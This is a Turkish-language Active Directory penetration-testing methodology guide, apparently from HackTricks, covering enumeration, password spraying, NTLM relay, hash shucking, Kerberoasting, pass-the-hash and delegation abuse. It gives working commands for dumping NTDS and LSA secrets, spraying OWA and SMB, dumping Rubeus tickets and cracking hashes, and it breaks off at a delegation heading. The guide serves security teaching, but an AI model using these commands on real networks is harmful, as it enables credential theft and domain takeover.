# Active Directory Metodolojisi

{{#include ../../banners/hacktricks-training.md}}

## Temel genel bakış

**Active Directory**, **network administrators**'ın bir ağ içinde **domains**, **users** ve **objects** oluşturup yönetmelerini sağlayan temel bir teknolojidir. Ölçeklenebilir şekilde tasarlanmıştır; çok sayıda kullanıcıyı yönetilebilir **groups** ve **subgroups** içine organize etmeyi ve farklı seviyelerde **access rights** kontrol etmeyi mümkün kılar.

**Active Directory** yapısı üç ana katmandan oluşur: **domains**, **trees**, ve **forests**. Bir **domain**, ortak bir veritabanını paylaşan **users** veya **devices** gibi nesnelerin koleksiyonunu kapsar. **Trees**, ortak bir yapı ile bağlı domain gruplarıdır ve bir **forest** ise birden çok tree'nin **trust relationships** aracılığıyla birbirine bağlandığı, organizasyon yapısının en üst katmanını temsil eder. Her bir seviyede özel **access** ve **communication rights** atanabilir.

**Active Directory** içindeki temel kavramlar şunlardır:

1. **Directory** – Active Directory nesnelerine ait tüm bilgilerin saklandığı yer.
2. **Object** – Directory içindeki varlıkları ifade eder; örneğin **users**, **groups**, veya **shared folders**.
3. **Domain** – Directory nesneleri için bir konteyner görevi görür; bir **forest** içinde birden fazla domain bulunabilir ve her birinin kendi nesne koleksiyonu vardır.
4. **Tree** – Ortak bir root domain'i paylaşan domain grubudur.
5. **Forest** – Active Directory'deki organizasyon yapısının zirvesi olup, aralarında **trust relationships** bulunan birden çok tree'den oluşur.

**Active Directory Domain Services (AD DS)**, merkezi yönetim ve ağ içi iletişim için kritik olan bir dizi hizmeti kapsar. Bu hizmetler şunlardır:

1. **Domain Services** – Veri depolamayı merkezi hale getirir ve **users** ile **domains** arasındaki etkileşimleri, dahil olmak üzere **authentication** ve **search** fonksiyonlarını yönetir.
2. **Certificate Services** – Güvenli **digital certificates** oluşturma, dağıtma ve yönetmeyi denetler.
3. **Lightweight Directory Services** – LDAP protokolü aracılığıyla directory-enabled uygulamaları destekler.
4. **Directory Federation Services** – Birden çok web uygulaması arasında tek oturum açma (**single-sign-on**) yeteneği sağlar.
5. **Rights Management** – Telif hakkı materyallerinin yetkisiz dağıtımını ve kullanımını sınırlayarak korunmasına yardımcı olur.
6. **DNS Service** – **domain names** çözümlemesi için kritik öneme sahiptir.

For a more detailed explanation check: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

To learn how to **attack an AD** you need to **understand** really good the **Kerberos authentication process**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Hızlı Başvuru

Bir AD'yi enumerate/exploit etmek için çalıştırabileceğiniz komutlara hızlı bir bakış için [https://wadcoms.github.io/](https://wadcoms.github.io) adresine bakabilirsiniz.

> [!WARNING]
> Kerberos iletişimi eylemleri gerçekleştirmek için **tam nitelikli ad (FQDN)** gerektirir. Eğer bir makineye IP adresi ile erişmeye çalışırsanız, **NTLM kullanır, Kerberos değil**.

## Recon Active Directory (No creds/sessions)

Eğer bir AD ortamına erişiminiz var ama herhangi bir kimlik bilgisi/oturumunuz yoksa şunları yapabilirsiniz:

- **Pentest the network:**
- Ağı tarayın, makineleri ve açık portları bulun ve bu makinelerden **exploit vulnerabilities** veya **extract credentials** elde etmeye çalışın (örneğin, [printers could be very interesting targets](ad-information-in-printers.md)).
- DNS enumerasyonu, domain içindeki web, printers, shares, vpn, media vb. gibi kilit sunucular hakkında bilgi verebilir.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Bunu nasıl yapacağınız hakkında daha fazla bilgi için Genel [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) sayfasına bakın.
- **Check for null and Guest access on smb services** (bu modern Windows sürümlerinde çalışmayabilir):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Bir SMB sunucusunu nasıl enumerate edeceğinize dair daha ayrıntılı rehber şuradadır:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- LDAP'i nasıl enumerate edeceğinize dair daha ayrıntılı rehber şuradadır (anonim erişime özellikle dikkat edin):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Gather credentials [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Access host by [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Gather credentials **exposing** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- İç belgelerden, sosyal medyadan, domain içindeki hizmetlerden (özellikle web) ve herkese açık kaynaklardan kullanıcı adları/isimleri çıkarın.
- Şirket çalışanlarının tam isimlerini bulursanız, farklı AD **username conventions** deneyebilirsiniz ([**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). En yaygın konvansiyonlar: _NameSurname_, _Name.Surname_, _NamSur_ (her birinden 3 harf), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _rastgele harf ve 3 rastgele sayı_ (abc123).
- Araçlar:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) ve [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) sayfalarına bakın.
- **Kerbrute enum**: Bir **invalid username is requested** durumunda sunucu **Kerberos error** kodu _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ ile yanıt verir; bu, kullanıcı adının geçersiz olduğunu anlamamıza olanak tanır. **Valid usernames** ise ya bir AS-REP yanıtında **TGT** alır ya da _KRB5KDC_ERR_PREAUTH_REQUIRED_ hatası döner; bu da kullanıcının pre-authentication yapması gerektiğini gösterir.
- **No Authentication against MS-NRPC**: Domain controller'lar üzerindeki MS-NRPC (Netlogon) arayüzüne auth-level = 1 (No authentication) ile bağlanma. Yöntem, MS-NRPC arayüzünü bind ettikten sonra `DsrGetDcNameEx2` fonksiyonunu çağırarak kullanıcı veya bilgisayarın kimlik bilgisi olmadan var olup olmadığını kontrol eder. Bu tür bir enumeration'ı uygulayan araç [NauthNRPC](https://github.com/sud0Ru/NauthNRPC)'dir. Araştırma şurada bulunabilir: [here](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Ağda bu sunuculardan birini bulduysanız, buna karşı **user enumeration** de gerçekleştirebilirsiniz. Örneğin, [**MailSniper**](https://github.com/dafthack/MailSniper) aracını kullanabilirsiniz:
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Kullanıcı adı listelerini [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  ve ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames))'da bulabilirsiniz.
>
> Ancak, bundan önce yapmanız gereken recon adımından **şirkette çalışan kişilerin isimlerine** sahip olmalısınız. İsim ve soyisim ile potansiyel geçerli kullanıcı adları üretmek için [**namemash.py**](https://gist.github.com/superkojiman/11076951) script'ini kullanabilirsiniz.

### Bir veya birkaç kullanıcı adını bilmek

Tamam, zaten geçerli bir kullanıcı adınız olduğunu ama parola olmadığını biliyorsunuz... O zaman deneyin:

- [**ASREPRoast**](asreproast.md): Eğer bir kullanıcının _DONT_REQ_PREAUTH_ özniteliği **yoksa**, o kullanıcı için bir **AS_REP message** talep edebilirsiniz; bu mesaj kullanıcının parolasından türetilen anahtarla şifrelenmiş bazı veriler içerir.
- [**Password Spraying**](password-spraying.md): Keşfedilen her kullanıcıyla en **yaygın parolaları** deneyin; belki bazı kullanıcılar zayıf parola kullanıyordur (parola politikasını unutmayın!).
- Ayrıca kullanıcıların mail sunucularına erişim sağlamak için **spray OWA servers** da deneyebileceğinizi unutmayın.

{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Ağın bazı protokollerini **poisoning** ederek kırmak için bazı challenge **hashes** elde edebilirsiniz:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Eğer active directory'yi enumerate etmeyi başardıysanız, **daha fazla e-posta ve ağ hakkında daha iyi bir anlayışa** sahip olursunuz. NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) zorlayarak AD ortamına erişim sağlayabilirsiniz.

### NetExec workspace-driven recon & relay posture checks

- Use **`nxcdb` workspaces** to keep AD recon state per engagement: `workspace create <name>` spawns per-protocol SQLite DBs under `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Switch views with `proto smb|mssql|winrm` and list gathered secrets with `creds`. Manually purge sensitive data when done: `rm -rf ~/.nxc/workspaces/<name>`.
- Hızlı alt ağ keşfi için **`netexec smb <cidr>`** **domain**, **OS build**, **SMB signing requirements**, ve **Null Auth** gibi bilgileri ortaya çıkarır. `(signing:False)` gösteren üyeler **relay-prone** iken, DC'ler genellikle signing ister.
- Hedeflemeyi kolaylaştırmak için NetExec çıktısından doğrudan **hostnames in /etc/hosts** oluşturun:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- When **SMB relay to the DC is blocked** by signing, still probe **LDAP** posture: `netexec ldap <dc>` highlights `(signing:None)` / weak channel binding. SMB signing required ama LDAP signing disabled olan bir DC, **relay-to-LDAP** hedefi olarak **SPN-less RBCD** gibi kötüye kullanımlara karşı hâlâ uygundur.

### Client-side printer credential leaks → bulk domain credential validation

- Printer/web UIs bazen HTML'e **maskelenmiş admin passwords** gömer. Kaynağı/devtools'u görüntülemek cleartext'i ortaya çıkarabilir (ör. `<input value="<password>">`), bu da Basic-auth ile scan/print depolarına erişim sağlar.
- Alınan print jobs, kullanıcı başına passwords içeren **plaintext onboarding docs** barındırabilir. Test ederken eşleştirmeleri doğru tutun:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

Eğer **null veya guest user** ile **diğer PC'lere veya paylaşımlara erişim** sağlayabiliyorsanız, bir SCF dosyası gibi **dosyalar yerleştirerek**, birisi bunlara eriştiğinde sizin aleyhinize bir **NTLM authentication** tetiklenmesini sağlayabilir ve böylece **NTLM challenge**'ını **çalıp** kırabilirsiniz:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** zaten sahip olduğunuz her NT hash'ini, anahtar materyali doğrudan NT hash'inden türetilen diğer, daha yavaş formatlar için bir aday parola olarak kabul eder. Kerberos RC4 ticket'lar, NetNTLM challenge'ları veya cached credentials içindeki uzun parolaları brute-force etmek yerine, NT hash'lerini Hashcat’in NT-candidate modlarına verirsiniz ve Hashcat düz metni hiç öğrenmeden parola yeniden kullanımını doğrular. Bu, domain kompromizasyonu sonrası binlerce güncel ve tarihsel NT hash'i hasat edebildiğiniz durumlarda özellikle etkilidir.

Use shucking when:

- NT corpus'unuz DCSync, SAM/SECURITY dump'ları veya credential vault'lardan geliyorsa ve diğer domain/forest'lerde yeniden kullanımını test etmeniz gerekiyorsa.
- RC4 tabanlı Kerberos materyali (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM yanıtları veya DCC/DCC2 blob'ları yakaladıysanız.
- Uzun, kırılması zor parola kullanımlarının yeniden kullanımını hızlıca kanıtlamak ve hemen Pass-the-Hash ile pivotlamak istiyorsanız.

Teknik, anahtarları NT hash'i olmayan şifreleme türlerine karşı çalışmaz (ör. Kerberos etype 17/18 AES). Bir domain AES-only uyguluyorsa, normal parola modlarına dönmelisiniz.

#### Building an NT hash corpus

- **DCSync/NTDS** – `secretsdump.py`'yi history ile kullanarak mümkün olan en geniş NT hash setini (ve önceki değerlerini) alın:

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History girişleri aday havuzunu önemli ölçüde genişletir çünkü Microsoft bir hesap için 24'e kadar önceki hash saklayabilir. NTDS sırlarını hasat etmenin diğer yolları için bakınız:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (veya Mimikatz `lsadump::sam /patch`) yerel SAM/SECURITY verilerini ve cached domain logon'ları (DCC/DCC2) çıkarır. Bunları dedupe edip aynı `nt_candidates.txt` listesine ekleyin.
- **Track metadata** – Her hash'i üreten username/domain bilgisini saklayın (wordlist sadece hex olsa bile). Hashcat kazanan adayı yazdırdığında hangi principal'ın parolayı yeniden kullandığını hemen anlarsınız.
- Aynı forest'tan veya trusted bir forest'tan gelen adayları tercih edin; bu, shucking sırasında örtüşme şansını maksimize eder.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notlar:

- NT-candidate girdileri **ham 32-hex NT hashleri** olarak kalmalıdır. Kural motorlarını devre dışı bırakın (no `-r`, no hybrid modes) çünkü mangling aday anahtar materyalini bozar.
- Bu modlar doğası gereği daha hızlı değildir, ama NTLM anahtar alanı (~30,000 MH/s bir M3 Max'te) Kerberos RC4'e (~300 MH/s) kıyasla ~100× daha hızlıdır. Küratörlü bir NT listesini test etmek yavaş formatta tüm parola uzayını keşfetmekten çok daha ucuzdur.
- Her zaman en son Hashcat build'ini çalıştırın (`git clone https://github.com/hashcat/hashcat && make install`) çünkü 31500/31600/35300/35400 modları yeni eklendi.
- Şu anda AS-REQ Pre-Auth için bir NT modu yoktur ve AES etype'ları (19600/19700) düz metin parolayı gerektirir çünkü anahtarları PBKDF2 ile UTF-16LE parolalardan türetilir, raw NT hash'lerinden değil.

#### Example – Kerberoast RC4 (mode 35300)

1. Düşük ayrıcalıklı bir kullanıcıyla hedef SPN için bir RC4 TGS yakalayın (detaylar için Kerberoast sayfasına bakın):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Ticket'i NT listenizle shuck edin:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat her NT adayı için RC4 anahtarını türetir ve `$krb5tgs$23$...` blob'unu doğrular. Eşleşme, service account'unuzun mevcut NT hash'lerinizden birini kullandığını doğrular.

3. Hemen PtH ile pivot yapın:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Gerekirse daha sonra `hashcat -m 1000 <matched_hash> wordlists/` ile düz metni geri kazanabilirsiniz.

#### Example – Cached credentials (mode 31600)

1. Kompromize bir workstation'dan cached logon'ları dump'layın:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. İlginizi çeken domain kullanıcısının DCC2 satırını `dcc2_highpriv.txt` içine kopyalayın ve shuck edin:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Başarılı bir eşleşme, listenizde zaten bilinen bir NT hash'ini verir ve cached kullanıcının parola yeniden kullanımını kanıtlar. Bunu doğrudan PtH için kullanın (`nxc smb <dc_ip> -u highpriv -H <hash>`) veya hızlı NTLM modunda brute-force ile string'i kurtarmaya çalışın.

Aynı iş akışı NetNTLM challenge-response'lar (`-m 27000/27100`) ve DCC (`-m 31500`) için de geçerlidir. Bir eşleşme belirlendiğinde relay, SMB/WMI/WinRM PtH başlatabilir veya NT hash'ini offline olarak mask/rule ile yeniden kırabilirsiniz.



## Enumerating Active Directory WITH credentials/session

Bu aşama için geçerli bir domain hesabının credentials veya session'ını kompromize etmiş olmanız gerekir. Eğer bazı geçerli credentials'ınız veya domain kullanıcısı olarak bir shell'iniz varsa, önceki bölümde verilen seçeneklerin hâlâ diğer kullanıcıları kompromize etmek için kullanılabilecek seçenekler olduğunu unutmayın.

Authenticated enumeration'a başlamadan önce **Kerberos double hop problem**'i bilmeniz gerekir.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Bir hesabı kompromize etmek, tüm domain'i kompromize etmeye başlamak için **büyük bir adımdır**, çünkü Active Directory Enumeration yapmaya başlayabileceksiniz:

[**ASREPRoast**](asreproast.md) ile şimdi olası her zayıf kullanıcıyı bulabilirsiniz ve [**Password Spraying**](password-spraying.md) ile tüm kullanıcı adlarının bir listesini elde edip kompromize hesap, boş parolalar ve yeni umut verici parolalarla deneyebilirsiniz.

- Temel bir recon yapmak için [**CMD** kullanabilirsiniz](../basic-cmd-for-pentesters.md#domain-info)
- Daha stealthy olması için [**powershell ile recon**](../basic-powershell-for-pentesters/index.html) de kullanabilirsiniz
- Daha detaylı bilgi çıkarmak için [**powerview**](../basic-powershell-for-pentesters/powerview.md) da kullanabilirsiniz
- Active Directory'de recon için başka harika bir araç da [**BloodHound**](bloodhound.md). Kullanılan collection metodlarına bağlı olarak **çok stealthy değildir**, ama buna önem vermiyorsanız kesinlikle denemelisiniz. Kullanıcıların nerelere RDP yapabildiğini, diğer gruplara giden yolları vb. bulun.
- **Diğer otomatik AD enumeration araçları:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- AD'nin [**DNS kayıtları**](ad-dns-records.md) ilginç bilgiler içerebilir.
- Directory'yi enumerate etmek için GUI'li bir araç kullanmak isterseniz **SysInternal** Suite içinden **AdExplorer.exe** kullanabilirsiniz.
- LDAP veritabanında **ldapsearch** ile _userPassword_ & _unixUserPassword_ alanlarında ya da _Description_ içinde credential arayabilirsiniz. Diğer yöntemler için bkz. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment).
- **Linux** kullanıyorsanız domain'i enumerate etmek için [**pywerview**](https://github.com/the-useless-one/pywerview) de kullanabilirsiniz.
- Ayrıca şu otomatik araçları deneyebilirsiniz:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Tüm domain kullanıcılarını çıkarmak**

Windows'ta tüm domain kullanıcı adlarını almak çok kolaydır (`net user /domain` ,`Get-DomainUser` veya `wmic useraccount get name,sid`). Linux'ta kullanabileceğiniz komutlar: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` veya `enum4linux -a -u "user" -p "password" <DC IP>`

> Bu Enumeration bölümü küçük görünse bile bu en önemli parçadır. Linklere (özellikle cmd, powershell, powerview ve BloodHound olanlara) erişin, bir domain'i nasıl enumerate edeceğinizi öğrenin ve kendinizi rahat hissedene kadar pratik yapın. Bir assessment sırasında bu, DA'ya ulaşmak veya hiçbir şey yapılamayacağına karar vermek için anahtar an olacaktır.

### Kerberoast

Kerberoasting, user account'lara bağlı hizmetler tarafından kullanılan **TGS ticket'ları** elde etmeyi ve bunların şifrelemesini—ki bu şifreleme user parolalarına dayanır—**offline** kırmayı içerir.

Detaylar için:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Bazı credentials elde ettiğinizde herhangi bir **makineye** erişiminiz olup olmadığını kontrol edebilirsiniz. Bunun için port taramalarınıza göre çeşitli protokollerle birden fazla sunucuya bağlanmayı denemek için **CrackMapExec** kullanabilirsiniz.

### Local Privilege Escalation

Eğer normal bir domain kullanıcısı olarak kompromize credential'larınız veya session'ınız varsa ve bu kullanıcı ile domain içindeki herhangi bir **makineye** erişiminiz varsa, yerel ayrıcalıkları yükseltmeye ve credential'ları aramaya çalışmalısınız. Çünkü sadece local administrator ayrıcalıklarıyla diğer kullanıcıların hash'lerini bellekten (LSASS) ve yerelde (SAM) dumplayabilirsiniz.

Bu kitapta [**Windows için local privilege escalation**](../windows-local-privilege-escalation/index.html) hakkında tam bir sayfa ve bir [**checklist**](../checklist-windows-privilege-escalation.md) bulunmaktadır. Ayrıca [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) kullanmayı unutmayın.

### Current Session Tickets

Mevcut kullanıcıda beklenmedik kaynaklara erişim izni veren **ticket** bulma ihtimaliniz çok **düşük** olsa da kontrol edebilirsiniz:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

If you have managed to enumerate the active directory you will have **daha fazla e-posta ve ağ hakkında daha iyi bir anlayış**. You might be able to to force NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Computer Shares | SMB Shares içinde Creds arayın

Artık bazı temel credentials'lara sahip olduğunuz için **bulup bulamayacağınızı** ve herhangi bir **AD içinde paylaşılan ilginç dosya** olup olmadığını kontrol etmelisiniz. Bunu manuel yapabilirsiniz ama çok sıkıcı, tekrarlayan bir iştir (ve kontrol etmeniz gereken yüzlerce doküman bulursanız daha da fazladır).

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Eğer **diğer PC'lere veya paylaşımlara erişim** sağlayabiliyorsanız, erişildiğinde size karşı bir **NTLM authentication'ı tetikleyecek** dosyaları (ör. bir SCF dosyası) **yerleştirebilirsiniz**, böylece **NTLM challenge**'ı **çalıp** kırabilirsiniz:

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Bu güvenlik açığı herhangi bir authenticated user'ın domain controller'ı **ele geçirmesine** izin veriyordu.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Aşağıdaki teknikler için normal bir domain user yeterli değildir; bu saldırıları gerçekleştirmek için bazı özel privileges/credentials gerekir.**

### Hash extraction

Umarız [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) (relaying dahil), [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html) gibi yöntemlerle **bazı local admin hesaplarını ele geçirmeyi** başarmışsınızdır.\
Sonra, tüm hash'leri bellekten ve lokalde dump etme zamanı.\
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Bir kullanıcının hash'ini elde ettiğinizde**, bunu kullanıcıyı **taklit etmek** için kullanabilirsiniz.\
O **hash'i kullanarak NTLM authentication gerçekleştirecek** bir **tool** kullanmanız gerekir, **veya** yeni bir **sessionlogon** oluşturup o **hash'i** **LSASS** içine **inject** edebilirsiniz; böylece herhangi bir **NTLM authentication** gerçekleştiğinde o **hash** kullanılacaktır. Son seçenek mimikatz'ın yaptığıdır.\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Bu saldırı, kullanıcı NTLM hash'ini Kerberos biletleri talep etmek için **kullanmayı** hedefler; NTLM protokolü üzerinden yaygın Pass The Hash'e bir alternatif olarak düşünülebilir. Bu nedenle, NTLM protokolünün devre dışı bırakıldığı ve yalnızca **Kerberos'un allowed** olduğu authentication senaryolarında özellikle **useful** olabilir.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Pass The Ticket (PTT) saldırı yönteminde, saldırganlar parola veya hash değerleri yerine bir kullanıcının **authentication ticket**'ını **çalırlar**. Bu çalınan bilet daha sonra kullanıcıyı **taklit etmek** için kullanılır ve ağ içindeki kaynaklara ve servislere yetkisiz erişim sağlar.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Eğer bir **local administrator**'ın **hash'ine** veya **password'üne** sahipseniz, bununla diğer **PC'lere** **lokal olarak login** yapmayı denemelisiniz.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Bu durumun oldukça **gürültülü** olduğunu ve **LAPS**'in bunu **hafifletebileceğini** unutmayın.

### MSSQL Abuse & Trusted Links

Eğer bir kullanıcının **MSSQL instance'larına erişim** ayrıcalıkları varsa, MSSQL host üzerinde (SA olarak çalışıyorsa) **komut çalıştırmak**, NetNTLM **hash**'ini **çalmak** veya hatta bir **relay attack** gerçekleştirmek için bunu kullanabilir.\
Ayrıca, bir MSSQL instance'ı farklı bir MSSQL instance tarafından trusted (database link) ise ve kullanıcı trusted veritabanı üzerinde ayrıcalıklara sahipse, **trust ilişkisini kullanarak diğer instance'ta da sorgu çalıştırabilecek**. Bu trust'lar zincirlenebilir ve bir noktada kullanıcı komut çalıştırabileceği yanlış yapılandırılmış bir veritabanı bulabilir.\
**Veritabanları arasındaki linkler forest trust'ları üzerinde bile çalışır.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Üçüncü taraf envanter ve deployment suite'leri genellikle kimlik bilgilerine ve kod yürütmeye güçlü yollar açar. Bakınız:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Eğer herhangi bir Computer objesinde [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) attribute'u varsa ve bilgisayar üzerinde domain ayrıcalıklarına sahipseniz, o bilgisayara giriş yapan her kullanıcının belleğinden TGT'leri dump edebilirsiniz.\
Dolayısıyla eğer bir **Domain Admin bilgisayara giriş yaparsa**, onun TGT'sini dump edip [Pass the Ticket](pass-the-ticket.md) kullanarak onun gibi impersonate edebilirsiniz.\
Constrained delegation sayesinde **otomatik olarak bir Print Server'ı** bile **ele geçirebilirsiniz** (umarız bir DC olmaz).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Eğer bir user veya computer "Constrained Delegation" için izinliyse, o hesap **herhangi bir kullanıcıyı taklit ederek bazı servislerde** erişim sağlayabilir.\
Sonrasında, bu user/computer'un **hash'ini compromise ederseniz**, bazı servislerde **herhangi bir kullanıcıyı** (domain admin'ler dahil) **taklit edebilirsiniz**.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Uzak bir computer'ın Active Directory objesi üzerinde **WRITE** ayrıcalığına sahip olmak, **yüksek ayrıcalıklı** kod yürütme elde etmeyi mümkün kılar:


